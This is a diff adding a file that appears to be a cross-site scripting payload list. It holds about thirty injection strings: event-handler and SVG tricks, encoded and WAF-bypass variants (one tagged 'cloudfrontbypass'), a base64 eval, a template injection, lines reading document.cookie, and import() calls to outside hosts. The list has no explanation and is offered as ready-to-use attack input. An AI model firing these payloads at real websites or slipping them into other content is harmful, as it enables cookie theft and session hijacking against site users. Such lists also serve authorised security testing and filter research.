@@ -1,0 +1,34 @@
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
+">'><details/open/ontoggle=confirm('XSS')>
+6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
+&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
+<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
+<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+<svg><circle><set onbegin=prompt(1) attributename=fill>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+"%3balert`1`%3b"
+asd"`> onpointerenter=x=prompt,x`XSS`
+<x onauxclick=import('//1152848220/')>click
+<x onauxclick=a=alert,a(domain)>click -@niksthehacker
+<x onauxclick=import('//1152848220/')>click
+<x onauxclick=import('//xss/')>click
+\"<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss
+{{constructor.constructor(alert`1`)()}}
+javascript:new%20Function`al\ert\`1\``;
+<script>Object.prototype.BOOMR = 1;
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23×000000028;document.domain)>
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+%22%27%3E%3Cscript%3Ealert%28%22payload%20Executed%22%29%3C%2Fscript%3EAAAAAAAAAAAAAAAAaaaaaaaa
+"><img src=x onmouseleave=print()> ..
+"><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
+“><sv\u01234\g\u01235/on\u01236load=confirm(1)>
+<a”/onclick=(confirm)(document.cookie)>Click Here!
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23×000000028;document.domain)>
+<script>prompt/*s*/(document.domain)</script>
+test",prompt%0A/*HelloWorld*/(document.domain)
+”<a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus> ”
+“javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie”
+<img ignored=() src=x onerror=prompt(1)>
+<a”/onclick=(confirm)(document.cookie)>Click Here!
